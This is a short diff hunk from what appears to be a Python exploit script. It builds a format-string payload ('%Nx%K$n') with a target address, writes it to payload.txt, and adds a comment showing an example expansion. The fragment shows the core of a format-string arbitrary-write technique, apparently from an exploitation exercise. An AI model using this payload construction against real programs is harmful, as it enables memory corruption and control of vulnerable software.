@@ -92,7 +92,7 @@ padding = target_val - written
 if padding < 0:
     padding += 256
 
-fmt = "%%%dx%%%d$n" % (padding, offset)
+fmt = "%%%dx%%%d$n" % (padding, offset) #"%%%dx%%%d$n" % (60, 4)   --> "%60x%4$n"
 payload = m_addr + fmt.encode("ascii")
 
 with open("payload.txt", "wb") as f:
